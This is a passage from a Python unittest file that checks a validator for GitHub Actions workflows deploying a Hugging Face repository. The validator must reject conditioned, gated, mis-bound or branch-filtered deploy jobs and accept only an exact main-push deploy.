                    self.fixture_contract(
                        UNFILTERED_MAIN_PUSH + textwrap.dedent(workflow)
                    )
                )

    def test_deployer_and_dockerfile_evidence_split_across_jobs_is_rejected(self) -> None:
        workflow = UNFILTERED_MAIN_PUSH + textwrap.dedent(
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
              unrelated:
                uses: example.invalid/workflows/other.yml@1111111111111111111111111111111111111111
                with:
                  dockerfile-path: Dockerfile
            """
        )
        self.assertFalse(self.fixture_contract(workflow))

    def test_inert_block_scalar_cannot_supply_the_jobs_map(self) -> None:
        workflow = UNFILTERED_MAIN_PUSH + textwrap.dedent(
            """
            env:
              INERT_DEPLOY_EXAMPLE: |
                jobs:
                  deploy:
                    uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                    with:
                      hf-repo: SZLHOLDINGS/a11oy
                      ref: ${{ github.sha }}
                      dockerfile-path: Dockerfile
            jobs:
              real_job:
                runs-on: ubuntu-latest
                steps:
                  - run: echo no-deploy
            """
        )
        self.assertFalse(self.fixture_contract(workflow))

    def test_deployer_and_dockerfile_evidence_in_same_job_passes(self) -> None:
        workflow = UNFILTERED_MAIN_PUSH + textwrap.dedent(
            """
            name: source-derived deploy
            jobs:
              unrelated:
                runs-on: ubuntu-latest
                steps:
                  - run: echo no-op
              deploy:
                name: Deploy, source-bind, and attest exact surface
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: "Dockerfile"
                  prune: true
                secrets:
                  HF_TOKEN: ${{ secrets.HF_ORG_TOKEN || secrets.HF_TOKEN }}
            """
        )
        self.assertTrue(self.fixture_contract(workflow))

    def test_source_and_destination_binding_is_exact(self) -> None:
        invalid_inputs = (
            """
            hf-repo: OTHER/a11oy
            ref: ${{ github.sha }}
            dockerfile-path: Dockerfile
            """,
            """
            hf-repo: SZLHOLDINGS/a11oy
            ref: main
            dockerfile-path: Dockerfile
            """,
            """
            hf-repo: SZLHOLDINGS/a11oy#other
            ref: ${{ github.sha }}
            dockerfile-path: Dockerfile
            """,
            """
            hf-repo: SZLHOLDINGS/a11oy
            ref: ${{ github.sha }}#stale
            dockerfile-path: Dockerfile
            """,
            """
            hf-repo: SZLHOLDINGS/a11oy
            ref: ${{ github.sha }}
            dockerfile-path: Dockerfile#other
            """,
            """
            hf-repo: SZLHOLDINGS/a11oy
            dockerfile-path: Dockerfile
            """,
            """
            hf-repo: SZLHOLDINGS/a11oy
            hf-repo: OTHER/a11oy
            ref: ${{ github.sha }}
            dockerfile-path: Dockerfile
            """,
            """
            nested:
              hf-repo: SZLHOLDINGS/a11oy
              ref: ${{ github.sha }}
              dockerfile-path: Dockerfile
            """,
        )
        for inputs in invalid_inputs:
            workflow = (
                UNFILTERED_MAIN_PUSH
                + textwrap.dedent(
                    """
                    jobs:
                      deploy:
                        uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                        with:
                    """
                )
                + textwrap.indent(textwrap.dedent(inputs), "      ")
            )
            with self.subTest(inputs=inputs):
                self.assertFalse(
                    self.fixture_contract(workflow)
                )

    def test_conditioned_deploy_job_is_rejected(self) -> None:
        condition_entries = (
            "if: false",
            "if : false",
            '"if": false',
            "'if' : false",
            "if: github.event_name == 'workflow_dispatch'",
            "<<: *possibly_conditioned",
        )
        for condition_entry in condition_entries:
            workflow = UNFILTERED_MAIN_PUSH + textwrap.dedent(
                f"""
                jobs:
                  deploy:
                    {condition_entry}
                    uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                    with:
                      hf-repo: SZLHOLDINGS/a11oy
                      ref: ${{{{ github.sha }}}}
                      dockerfile-path: Dockerfile
                """
            )
            with self.subTest(condition_entry=condition_entry):
                self.assertFalse(
                    self.fixture_contract(workflow)
                )

    def test_dependency_gated_deploy_job_is_rejected(self) -> None:
        needs_entries = (
            "needs: gate",
            "needs : [build, gate]",
            '"needs": gate',
        )
        for needs_entry in needs_entries:
            workflow = UNFILTERED_MAIN_PUSH + textwrap.dedent(
                f"""
                jobs:
                  gate:
                    if: false
                    runs-on: ubuntu-latest
                    steps:
                      - run: echo skipped
                  deploy:
                    {needs_entry}
                    uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                    with:
                      hf-repo: SZLHOLDINGS/a11oy
                      ref: ${{{{ github.sha }}}}
                      dockerfile-path: Dockerfile
                """
            )
            with self.subTest(needs_entry=needs_entry):
                self.assertFalse(
                    self.fixture_contract(workflow)
                )

    def test_ordered_negative_branch_patterns_can_exclude_main(self) -> None:
        branch_lists = (
            "[main, '!main']",
            "[m*, '!m*']",
            "[main, '!mai+n']",
            "[main, '!mai?n']",
        )
        deploy = textwrap.dedent(
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: Dockerfile
            """
        )
        for branches in branch_lists:
            trigger = textwrap.dedent(
                f"""
                on:
                  push:
                    branches: {branches}
                """
            )
            with self.subTest(branches=branches):
                self.assertFalse(
                    self.fixture_contract(trigger + deploy)
                )

        reinclude = textwrap.dedent(
            """
            on:
              push:
                branches: [m*, '!m*', main]
            """
        )
        self.assertTrue(
            self.fixture_contract(reinclude + deploy)
        )
        block_comment = textwrap.dedent(
            """
            on:
              push:
                branches:
                  - main # protected branch
            """
        )
        self.assertTrue(
            self.fixture_contract(block_comment + deploy)
        )
        for branches in ("[mai+n]", "[mai?n]"):
            extended = textwrap.dedent(
                f"""
                on:
                  push:
                    branches: {branches}
                """
            )
            with self.subTest(branches=branches):
                self.assertTrue(
                    self.fixture_contract(extended + deploy)
                )

    def test_inline_branch_sequences_preserve_quoted_commas(self) -> None:
        deploy = textwrap.dedent(
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: Dockerfile
            """
        )
        for branches in (
            '["main,disabled"]',
            "['main,disabled']",
            '["main,disabled]',
        ):
            trigger = textwrap.dedent(
                f"""
                on:
                  push:
                    branches: {branches}
                """
            )
            with self.subTest(branches=branches):
                self.assertFalse(
                    self.fixture_contract(trigger + deploy)
                )

        quoted_main = textwrap.dedent(
            """
            on:
              push:
                branches: ["feature,only", "main"]
            """
        )
        self.assertTrue(
            self.fixture_contract(quoted_main + deploy)
        )

    def test_filtered_or_non_main_push_trigger_is_rejected(self) -> None:
        triggers = (
            """
            on:
              push:
                branches: [main]
                paths: [serve.py]
            """,
            """
            "on" :
              push:
                branches:
                  - feature-only
            """,
            """
            on:
              push:
                branches-ignore: [main]
            """,
            """
            on:
              push:
                <<: *possibly_filtered
                branches: [main]
            """,
            """
            on:
              push:
                tags: ['v*']
            """,
            """
            on:
              push:
                tags-ignore: [preview]
            """,
            """
            on:
              push:
                branches:
                  - main#disabled
            """,
            """
            on:
              workflow_dispatch: {}
            """,
        )
        deploy = textwrap.dedent(
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: Dockerfile
            """
        )
        for trigger in triggers:
            with self.subTest(trigger=trigger):
                self.assertFalse(
                    self.fixture_contract(
                        textwrap.dedent(trigger) + deploy
                    )
                )

    def test_shipped_repository_passes_the_real_lockstep_guard(self) -> None:
        with mock.patch.object(sys, "argv", ["check_copy_sync_lockstep.py", str(ROOT)]):
            self.assertEqual(0, CHECKER.main())


if __name__ == "__main__":
    unittest.main(verbosity=2)
